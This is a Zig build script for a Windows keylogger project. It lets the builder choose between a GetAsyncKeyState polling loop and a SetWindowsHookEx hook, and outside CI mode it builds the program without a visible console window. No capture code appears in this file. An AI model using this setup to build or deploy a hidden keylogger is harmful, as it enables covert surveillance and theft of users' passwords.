const config = @import("build.zig.zon");
const std = @import("std");
const types = @import("src/types.zig");
const print = std.debug.print;
const aprint = std.fmt.allocPrint;
const eql = std.mem.eql;

const BuildError = error{
    InvalidMethod,
};

pub fn build(b: *std.Build) !void {
    const version = try std.SemanticVersion.parse(config.version);
    const target = b.standardTargetOptions(.{});
    const optimize = b.standardOptimizeOption(.{
        .preferred_optimize_mode = .small,
    });
    const is_ci = b.option(bool, "ci", "Enable CI mode") orelse false;
    const method_s = b.option([]const u8, "method", "Method ('loop': GetAsyncKeyState loop; 'hook': SetWindowsHookEx)") orelse "hook";

    const method_e: types.Method = if (eql(u8, method_s, "loop"))
        .loop
    else if (eql(u8, method_s, "hook"))
        .hook
    else
        return BuildError.InvalidMethod;

    const target_name = try if (is_ci)
        aprint(b.allocator, "keylogger-{s}", .{method_s})
    else if (eql(u8, target.result.cpu.model.name, "x86_64"))
        aprint(b.allocator, "keylogger-{s}-{s}", .{
            @tagName(target.result.cpu.arch),
            method_s,
        })
    else
        aprint(b.allocator, "keylogger-{s}-{s}-{s}", .{
            @tagName(target.result.cpu.arch),
            target.result.cpu.model.name,
            method_s,
        });

    print("version: {s}\n", .{config.version});
    print("target arch: {s}\n", .{@tagName(target.result.cpu.arch)});
    print("target cpu: {s}\n", .{target.result.cpu.model.name});
    print("target os: {s}\n", .{@tagName(target.result.os.tag)});
    print("target name: {s}\n", .{target_name});
    print("optimize: {s}\n", .{@tagName(optimize)});
    print("is_ci: {any}\n", .{is_ci});
    print("method: {s}\n", .{method_s});

    const translate_c = b.addTranslateC(.{
        .root_source_file = b.path("src/c.h"),
        .target = target,
        .optimize = optimize,
    });

    const build_options = b.addOptions();
    build_options.addOption([]const u8, "VERSION", config.version);
    build_options.addOption(types.Method, "METHOD", method_e);

    const exe_mod = b.createModule(.{
        .root_source_file = b.path("src/main.zig"),
        .target = target,
        .optimize = optimize,
        .strip = optimize != .debug,
        .link_libc = true,
        .imports = &.{
            .{
                .name = "c",
                .module = translate_c.createModule(),
            },
        },
    });
    exe_mod.addOptions("build_options", build_options);

    const exe = b.addExecutable(.{
        .name = target_name,
        .version = version,
        .root_module = exe_mod,
    });
    if (!is_ci) {
        exe.subsystem = .windows;
    }
    b.installArtifact(exe);

    const run_cmd = b.addRunArtifact(exe);
    run_cmd.step.dependOn(b.getInstallStep());
    run_cmd.addPassthruArgs();

    const run_step = b.step("run", "Run the app");
    run_step.dependOn(&run_cmd.step);

    const exe_unit_tests = b.addTest(.{
        .root_module = exe_mod,
    });

    const run_exe_unit_tests = b.addRunArtifact(exe_unit_tests);

    const test_step = b.step("test", "Run unit tests");
    test_step.dependOn(&run_exe_unit_tests.step);
}
